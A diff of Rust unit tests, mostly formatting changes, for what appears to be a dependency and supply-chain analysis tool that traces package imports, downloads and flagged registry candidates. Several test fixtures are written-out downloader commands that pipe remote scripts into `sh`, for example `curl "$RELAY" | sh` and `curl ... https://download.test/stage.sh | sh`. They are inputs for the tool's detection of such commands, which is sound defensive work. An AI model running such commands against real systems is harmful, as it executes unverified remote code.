+            "pkg:pypi/Some_Pkg?version_requirement=%3C2.0"
+        );
         assert_eq!(locator(&references_only[3].1[0]), "pkg:pypi/some-pkg@8.0");
         let mut all = original.clone();
         assert_eq!(reconcile_python_imports(&report, &mut all, true).len(), 2);
@@ -7034,10 +7325,16 @@ mod tests {
         // The same source bytes can belong to both environments. Follow their
         // two declared possibilities rather than selecting unconstrained latest.
         report.files[4].sha256 = "code-a".into();
-        let mut shared = original.clone(); shared[3].0 = "code-a".into();
+        let mut shared = original.clone();
+        shared[3].0 = "code-a".into();
         reconcile_python_imports(&report, &mut shared, false);
         assert_eq!(shared[1].1.len(), 2);
-        assert!(!shared[1].1.iter().any(|r| locator(r) == "pkg:pypi/some_pkg"));
+        assert!(
+            !shared[1]
+                .1
+                .iter()
+                .any(|r| locator(r) == "pkg:pypi/some_pkg")
+        );
 
         // A nested package boundary does not borrow its parent's requirement.
         report.files[2].path = "bundle.zip!!a/nested/app.py".into();
@@ -7055,8 +7352,20 @@ mod tests {
             {"id":1,"path":"owner.whl!!pkg/app.py","depth":1,"file_type":"python","sha256":"code","size":20},
             {"id":2,"path":"sibling.whl","depth":0,"file_type":"whl","sha256":"sibling","size":100}
         ]));
-        let import = || Reference::new(RefLocator::Purl("pkg:pypi/provider".into()), RefKind::Command, "ast-python-import-candidate", "provider.api");
-        let mut declaration = Reference::new(RefLocator::Purl("pkg:pypi/provider@2.0".into()), RefKind::Dependency, "wheel", "provider");
+        let import = || {
+            Reference::new(
+                RefLocator::Purl("pkg:pypi/provider".into()),
+                RefKind::Command,
+                "ast-python-import-candidate",
+                "provider.api",
+            )
+        };
+        let mut declaration = Reference::new(
+            RefLocator::Purl("pkg:pypi/provider@2.0".into()),
+            RefKind::Dependency,
+            "wheel",
+            "provider",
+        );
         declaration.context = Some(filefacts::DependencyContext {
             scope: filefacts::DependencyScope::Development,
             optional: false,
@@ -7066,17 +7375,34 @@ mod tests {
         let original = vec![
             ("wheel".into(), vec![declaration]),
             ("code".into(), vec![import()]),
-            ("sibling".into(), vec![Reference::new(RefLocator::Purl("pkg:pypi/provider@9.0".into()), RefKind::Dependency, "wheel", "provider")]),
+            (
+                "sibling".into(),
+                vec![Reference::new(
+                    RefLocator::Purl("pkg:pypi/provider@9.0".into()),
+                    RefKind::Dependency,
+                    "wheel",
+                    "provider",
+                )],
+            ),
         ];
         let mut references_only = original.clone();
         reconcile_python_imports(&report, &mut references_only, false);
         assert_eq!(locator(&references_only[1].1[0]), "pkg:pypi/provider@2.0");
-        assert_eq!(references_only[1].1[0].context.as_ref().unwrap().scope, filefacts::DependencyScope::Development);
+        assert_eq!(
+            references_only[1].1[0].context.as_ref().unwrap().scope,
+            filefacts::DependencyScope::Development
+        );
         let mut all = original;
         assert_eq!(reconcile_python_imports(&report, &mut all, true).len(), 1);
-        assert!(all[1].1.is_empty(), "excluded development dependencies must not be reintroduced as unconstrained runtime imports");
+        assert!(
+            all[1].1.is_empty(),
+            "excluded development dependencies must not be reintroduced as unconstrained runtime imports"
+        );
 
-        let mut unrelated = vec![("code".into(), vec![import()]), references_only.pop().unwrap()];
+        let mut unrelated = vec![
+            ("code".into(), vec![import()]),
+            references_only.pop().unwrap(),
+        ];
         reconcile_python_imports(&report, &mut unrelated, false);
         assert_eq!(locator(&unrelated[0].1[0]), "pkg:pypi/provider");
     }
@@ -7084,45 +7410,90 @@ mod tests {
     #[test]
     fn ruby_process_downloads_are_discovered_from_retained_and_fetched_member_facts() {
         let source = b"if File.exist?('/tmp/marker')\n system \"curl -fsSL https://ruby.fixturetests.net/b/endpoint >/dev/null 2>&1\"\nend\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("formula.rb")).open(source);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("formula.rb"))
+            .open(source);
         let sub = report_of(&serde_json::json!([
             {"id":0,"path":"bundle.zip","depth":0,"file_type":"zip","sha256":"c".repeat(64),"size":300},
             {"id":1,"parent_id":0,"path":"bundle.zip!!formula.rb","depth":1,"file_type":"ruby","sha256":"b".repeat(64),"size":source.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]));
-        let retained: AnalysisReport = serde_json::from_slice(&serde_json::to_vec(&sub).unwrap()).unwrap();
-        let refs = collect_references_from_input(&retained, Path::new("not-on-disk"), None, CiRefs::Skip);
-        let found: Vec<_> = refs.iter().flat_map(|(_, refs)| refs).filter(|r| r.source == "ast-fetch-call").collect();
+        let retained: AnalysisReport =
+            serde_json::from_slice(&serde_json::to_vec(&sub).unwrap()).unwrap();
+        let refs =
+            collect_references_from_input(&retained, Path::new("not-on-disk"), None, CiRefs::Skip);
+        let found: Vec<_> = refs
+            .iter()
+            .flat_map(|(_, refs)| refs)
+            .filter(|r| r.source == "ast-fetch-call")
+            .collect();
         assert_eq!(found.len(), 1);
-        assert_eq!(locator(found[0]), "https://ruby.fixturetests.net/b/endpoint");
+        assert_eq!(
+            locator(found[0]),
+            "https://ruby.fixturetests.net/b/endpoint"
+        );
 
         let mut importer = report_of(&serde_json::json!([
             {"id":0,"path":"entry.sh","depth":0,"file_type":"shell","sha256":"a".repeat(64),"size":30}
         ]));
-        let mut record = FetchRecord::terminal("https://ruby.fixturetests.net/archive.zip".into(), Outcome::Ok);
+        let mut record = FetchRecord::terminal(
+            "https://ruby.fixturetests.net/archive.zip".into(),
+            Outcome::Ok,
+        );
         record.source_sha256 = Some("a".repeat(64));
         record.content_sha256 = Some("c".repeat(64));
         let mut graft = Graft::new(&importer);
-        let next = merge_payload(&mut importer, &mut graft, &record, Analyzed {
-            sub: Some(retained), content_sha: "c".repeat(64), next_from_bytes: Vec::new(), corpus: None,
-        });
-        let found: Vec<_> = next.iter().flat_map(|(sha, refs)| refs.iter().filter(|r| r.source == "ast-fetch-call").map(move |r| (sha, r))).collect();
+        let next = merge_payload(
+            &mut importer,
+            &mut graft,
+            &record,
+            Analyzed {
+                sub: Some(retained),
+                content_sha: "c".repeat(64),
+                next_from_bytes: Vec::new(),
+                corpus: None,
+            },
+        );
+        let found: Vec<_> = next
+            .iter()
+            .flat_map(|(sha, refs)| {
+                refs.iter()
+                    .filter(|r| r.source == "ast-fetch-call")
+                    .map(move |r| (sha, r))
+            })
+            .collect();
         assert_eq!(found.len(), 1);
         assert_eq!(found[0].0, &"b".repeat(64));
-        assert_eq!(locator(found[0].1), "https://ruby.fixturetests.net/b/endpoint");
+        assert_eq!(
+            locator(found[0].1),
+            "https://ruby.fixturetests.net/b/endpoint"
+        );
     }
 
     #[test]
     fn ruby_dynamic_downloader_arguments_produce_a_visible_gap_without_a_guessed_url() {
         let source = b"system('curl', options, 'https://ruby.fixturetests.net/after-unknown')\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("runtime.rb")).open(source);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("runtime.rb"))
+            .open(source);
         let report = report_of(&serde_json::json!([
             {"id":0,"path":"runtime.rb","depth":0,"file_type":"ruby","sha256":"a".repeat(64),"size":source.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]));
-        let groups = collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Skip);
-        assert!(groups.iter().all(|(_, refs)| refs.iter().all(|r| r.source != "ast-fetch-call")));
-        let records = unresolved_downloader_records(&report, &FetchPolicy::parse_follow("references").unwrap());
+        let groups =
+            collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Skip);
+        assert!(
+            groups
+                .iter()
+                .all(|(_, refs)| refs.iter().all(|r| r.source != "ast-fetch-call"))
+        );
+        let records = unresolved_downloader_records(
+            &report,
+            &FetchPolicy::parse_follow("references").unwrap(),
+        );
         assert_eq!(records.len(), 1);
-        assert_eq!(records[0].source_sha256.as_deref(), Some("a".repeat(64).as_str()));
+        assert_eq!(
+            records[0].source_sha256.as_deref(),
+            Some("a".repeat(64).as_str())
+        );
         assert!(records[0].content_sha256.is_none());
         assert!(terminal_fetch_row_visible(&records[0]));
         assert_eq!(fetch_row(&records[0]).label, "gap");
@@ -7132,25 +7503,40 @@ mod tests {
     #[test]
     fn python_stubs_are_not_followed_from_retained_facts() {
         let source = b"from scapy.tools.UTscapy import main\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("types.py")).open(source);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("types.py"))
+            .open(source);
         let report = report_of(&serde_json::json!([
             {"id":0,"path":"bundle.zip","depth":0,"file_type":"zip","sha256":"root","size":100},
             {"id":1,"path":"bundle.zip!!types.pyi","depth":1,"file_type":"python","sha256":"stub","size":source.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]));
-        let groups = collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Skip);
-        assert!(!groups.iter().flat_map(|(_, refs)| refs).any(is_python_import_candidate));
+        let groups =
+            collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Skip);
+        assert!(
+            !groups
+                .iter()
+                .flat_map(|(_, refs)| refs)
+                .any(is_python_import_candidate)
+        );
     }
 
     #[test]
     fn python_static_imports_reach_the_worklist_without_original_bytes() {
         let source = b"from scapy.tools.UTscapy import main as run\nfrom .helpers import client\nimport sys\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("entry.py")).open(source);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("entry.py"))
+            .open(source);
         let report = report_of(&serde_json::json!([
             {"id":0,"path":"bundle.zip","depth":0,"file_type":"zip","sha256":"a".repeat(64),"size":500},
             {"id":1,"path":"bundle.zip!!entry.py","depth":1,"file_type":"python","sha256":"b".repeat(64),"size":source.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]));
-        let groups = collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Skip);
-        let refs: Vec<_> = groups.iter().flat_map(|(_, refs)| refs).filter(|r| is_python_import_candidate(r)).collect();
+        let groups =
+            collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Skip);
+        let refs: Vec<_> = groups
+            .iter()
+            .flat_map(|(_, refs)| refs)
+            .filter(|r| is_python_import_candidate(r))
+            .collect();
         assert_eq!(refs.len(), 1);
         assert_eq!(locator(refs[0]), "pkg:pypi/scapy");
         assert_eq!(refs[0].evidence, "scapy.tools.UTscapy");
@@ -7175,34 +7561,70 @@ mod tests {
 
     #[test]
     fn python_candidate_provider_requires_runtime_namespace_and_keeps_uncertainty() {
-        let reference = Reference::new(RefLocator::Purl("pkg:pypi/scapy".into()), RefKind::Command, "ast-python-import-candidate", "scapy.tools.UTscapy");
+        let reference = Reference::new(
+            RefLocator::Purl("pkg:pypi/scapy".into()),
+            RefKind::Command,
+            "ast-python-import-candidate",
+            "scapy.tools.UTscapy",
+        );
         let mut report = report_of(&serde_json::json!([
             {"id":0,"path":"candidate.whl","depth":0,"file_type":"whl","sha256":"root","size":100},
             {"id":1,"path":"candidate.whl!!other/__init__.py","depth":1,"file_type":"python","sha256":"wrong","size":20}
         ]));
         let mut record = FetchRecord::terminal("pkg:pypi/scapy@1.0".into(), Outcome::Ok);
         record.content_sha256 = Some("candidate-hash".into());
-        assert!(!annotate_python_import_candidate(&mut record, &reference, Some(&report), None));
+        assert!(!annotate_python_import_candidate(
+            &mut record,
+            &reference,
+            Some(&report),
+            None
+        ));
         assert!(analysis_unavailable(&record));
         assert!(terminal_fetch_row_visible(&record));
         assert_eq!(fetch_row(&record).label, "gap");
-        assert_eq!(record.outcome, Outcome::Ok, "retrieval success is distinct from provider verification");
+        assert_eq!(
+            record.outcome,
+            Outcome::Ok,
+            "retrieval success is distinct from provider verification"
+        );
         report.files[1].path = "candidate.whl!!scapy/__init__.pyi".into();
         assert!(!python_candidate_provides_namespace(&reference, &report));
         report.files[1].path = "candidate.whl!!scapy/__init__.py".into();
         record.coverage_note = Some("analysis incomplete".into());
-        assert!(annotate_python_import_candidate(&mut record, &reference, Some(&report), None));
-        assert!(record.coverage_note.as_deref().unwrap().starts_with("analysis incomplete; Python import candidate"));
-        assert!(record.coverage_note.as_deref().unwrap().contains("installed distribution/version unknown"));
+        assert!(annotate_python_import_candidate(
+            &mut record,
+            &reference,
+            Some(&report),
+            None
+        ));
+        assert!(
+            record
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .starts_with("analysis incomplete; Python import candidate")
+        );
+        assert!(
+            record
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("installed distribution/version unknown")
+        );
         report.files[0].path = "candidate.tar.gz".into();
         report.files[0].file_type = "tar".into();
-        assert!(!python_candidate_provides_namespace(&reference, &report), "sdist contents do not establish an installed module layout");
+        assert!(
+            !python_candidate_provides_namespace(&reference, &report),
+            "sdist contents do not establish an installed module layout"
+        );
     }
 
     #[test]
     fn unresolved_shell_fetches_retain_root_and_member_coverage_gaps() {
         let script = b"curl -fsSL \"$RELAY\" | sh\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("stage.sh")).open(script);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("stage.sh"))
+            .open(script);
         let report = report_of(&serde_json::json!([
             {"id":0,"path":"root.sh","depth":0,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}},
             {"id":1,"path":"archive.tgz!!package/stage.sh","depth":1,"file_type":"shell","sha256":"b".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}},
@@ -7217,7 +7639,12 @@ mod tests {
             assert!(matches!(record.outcome, Outcome::Unresolved(_)));
             assert_eq!(record.kind, RefKind::UrlFetch);
             assert!(record.resolved_url.is_none() && record.content_sha256.is_none());
-            assert!(record.coverage_note.as_deref().is_some_and(|note| note.starts_with("analysis unavailable")));
+            assert!(
+                record
+                    .coverage_note
+                    .as_deref()
+                    .is_some_and(|note| note.starts_with("analysis unavailable"))
+            );
             assert!(terminal_fetch_row_visible(record));
             assert_eq!(fetch_row(record).label, "gap");
             assert!(!record.locator.contains("RELAY"));
@@ -7230,14 +7657,21 @@ mod tests {
     #[test]
     fn literal_shell_fetches_have_references_without_runtime_gaps() {
         let script = b"curl -H \"$AUTH\" https://download.test/stage.sh | sh\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("stage.sh")).open(script);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("stage.sh"))
+            .open(script);
         let report = report_of(&serde_json::json!([
             {"id":0,"path":"archive.tgz!!stage.sh","depth":1,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]));
         let policy = FetchPolicy::parse_selection("all", true).expect("policy");
         assert!(unresolved_downloader_records(&report, &policy).is_empty());
-        let refs = collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Include);
-        assert!(refs.iter().flat_map(|(_, refs)| refs).any(|r| locator(r) == "https://download.test/stage.sh"));
+        let refs =
+            collect_references_from_input(&report, Path::new("not-on-disk"), None, CiRefs::Include);
+        assert!(
+            refs.iter()
+                .flat_map(|(_, refs)| refs)
+                .any(|r| locator(r) == "https://download.test/stage.sh")
+        );
     }
 
     fn dropper(url: &str) -> bool {
@@ -9212,7 +9646,12 @@ mod tests {
             {"id":3,"path":"root.tgz!!package/nested/package.json","depth":1,"file_type":"package.json","sha256":sha('d'),"size":1},
             {"id":4,"path":"root.tgz!!package/nested/index.js","depth":1,"file_type":"javascript","sha256":sha('e'),"size":1}
         ]})).unwrap();
-        let dep = Reference::new(RefLocator::Purl("pkg:npm/normalize-url?version_requirement=%5E3".into()), RefKind::Dependency, "package.json", "normalize-url");
+        let dep = Reference::new(
+            RefLocator::Purl("pkg:npm/normalize-url?version_requirement=%5E3".into()),
+            RefKind::Dependency,
+            "package.json",
+            "normalize-url",
+        );
         let groups = vec![(sha('b'), vec![dep])];
         let result = declared_npm_imports_in_hop(&report, &groups);
         assert!(result[&sha('c')].contains_key("normalize-url"));
@@ -10103,11 +10542,17 @@ mod dependency_gap_tests {
     #[test]
     fn unresolved_downloader_records_survive_an_empty_worklist_and_deduplicate() {
         let script = b"curl \"$REMOTE\" | sh\n";
-        let parsed = filefacts::OpenOptions::new().path(Path::new("stage.sh")).open(script);
+        let parsed = filefacts::OpenOptions::new()
+            .path(Path::new("stage.sh"))
+            .open(script);
         let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
             {"id":0,"path":"root.sh","depth":0,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]})).unwrap();
-        let mut session = session(&report, FetchPolicy::parse_follow("references").unwrap(), None);
+        let mut session = session(
+            &report,
+            FetchPolicy::parse_follow("references").unwrap(),
+            None,
+        );
         session.record_unresolved_fetch_calls(&report);
         session.record_unresolved_fetch_calls(&report);
         session.run(&mut report, Vec::new());
@@ -10137,9 +10582,18 @@ mod dependency_gap_tests {
         session.run(&mut report, Vec::new());
         assert_eq!(session.out.records.len(), 1);
         let record = &session.out.records[0];
-        assert_eq!(record.source_sha256.as_deref(), Some("a".repeat(64).as_str()));
+        assert_eq!(
+            record.source_sha256.as_deref(),
+            Some("a".repeat(64).as_str())
+        );
         assert_eq!(record.kind, RefKind::Dependency);
-        assert!(record.coverage_note.as_deref().unwrap().starts_with("analysis unavailable: Maven POM"));
+        assert!(
+            record
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .starts_with("analysis unavailable: Maven POM")
+        );
         let disabled = FetchPolicy::parse_follow("none").unwrap();
         assert!(unresolved_maven_records(&report, &disabled).is_empty());
     }
@@ -10158,30 +10612,87 @@ mod dependency_gap_tests {
             {"id":0,"path":"candidate.registry.json","depth":0,"file_type":"registry","sha256":"d".repeat(64),"size":100,
              "findings":[{"id":"objectives/test::hostile-registry","crit":"hostile"}]}
         ]})).unwrap();
-        let reference = Reference::new(RefLocator::Purl("pkg:pypi/scapy".into()), RefKind::Command, "ast-python-import-candidate", "scapy.tools.UTscapy");
+        let reference = Reference::new(
+            RefLocator::Purl("pkg:pypi/scapy".into()),
+            RefKind::Command,
+            "ast-python-import-candidate",
+            "scapy.tools.UTscapy",
+        );
         let mut record = FetchRecord::terminal("pkg:pypi/scapy@1.0".into(), Outcome::Ok);
         record.kind = RefKind::Command;
         record.content_sha256 = Some("b".repeat(64));
         record.source_sha256 = Some("a".repeat(64));
         let group = GroupFetch {
             source_sha: "a".repeat(64),
-            registries: vec![Gated { reference: reference.clone(), record: Registry { ecosystem: "pypi".into(), name: "scapy".into(), version: "1.0".into(), ..Default::default() }, sources: None, provenance: None, skip: None }],
-            landed: vec![Landed { reference, record, standing: Standing::Analyze }],
+            registries: vec![Gated {
+                reference: reference.clone(),
+                record: Registry {
+                    ecosystem: "pypi".into(),
+                    name: "scapy".into(),
+                    version: "1.0".into(),
+                    ..Default::default()
+                },
+                sources: None,
+                provenance: None,
+                skip: None,
+            }],
+            landed: vec![Landed {
+                reference,
+                record,
+                standing: Standing::Analyze,
+            }],
         };
-        let analysis = GroupAnalysis { registries: vec![Some(registry_report)], payloads: vec![Some(Analyzed { content_sha: "b".repeat(64), sub: Some(unrelated), next_from_bytes: Vec::new(), corpus: None })] };
-        let mut pass = session(&importer, FetchPolicy::parse_follow("references").unwrap(), None);
+        let analysis = GroupAnalysis {
+            registries: vec![Some(registry_report)],
+            payloads: vec![Some(Analyzed {
+                content_sha: "b".repeat(64),
+                sub: Some(unrelated),
+                next_from_bytes: Vec::new(),
+                corpus: None,
+            })],
+        };
+        let mut pass = session(
+            &importer,
+            FetchPolicy::parse_follow("references").unwrap(),
+            None,
+        );
         let mut next = Vec::new();
         pass.merge_group(&mut importer, group, analysis, &mut next);
-        assert_eq!(importer.files.len(), 1, "neither unrelated code nor its registry claims are facts about this importer");
+        assert_eq!(
+            importer.files.len(),
+            1,
+            "neither unrelated code nor its registry claims are facts about this importer"
+        );
         assert!(next.is_empty());
         assert!(pass.out.registries.is_empty());
         assert_eq!(pass.out.records.len(), 1);
         assert!(analysis_unavailable(&pass.out.records[0]));
         assert!(terminal_fetch_row_visible(&pass.out.records[0]));
-        assert!(pass.out.records[0].coverage_note.as_deref().unwrap().contains("hostile:objectives/test::hostile-candidate"));
-        assert!(pass.out.records[0].coverage_note.as_deref().unwrap().contains("hostile:objectives/test::hostile-registry"));
-        assert!(pass.out.records[0].coverage_note.as_deref().unwrap().contains("2 unique severe findings"));
-        assert_eq!(fetch_row(&pass.out.records[0]).detail.as_deref(), Some("candidate flagged"));
+        assert!(
+            pass.out.records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("hostile:objectives/test::hostile-candidate")
+        );
+        assert!(
+            pass.out.records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("hostile:objectives/test::hostile-registry")
+        );
+        assert!(
+            pass.out.records[0]
+                .coverage_note
+                .as_deref()
+                .unwrap()
+                .contains("2 unique severe findings")
+        );
+        assert_eq!(
+            fetch_row(&pass.out.records[0]).detail.as_deref(),
+            Some("candidate flagged")
+        );
         let attention = dependency_attention(&pass.out.records);
         assert_eq!(attention.gaps, 1);
         assert_eq!(attention.flagged_candidates, 1);
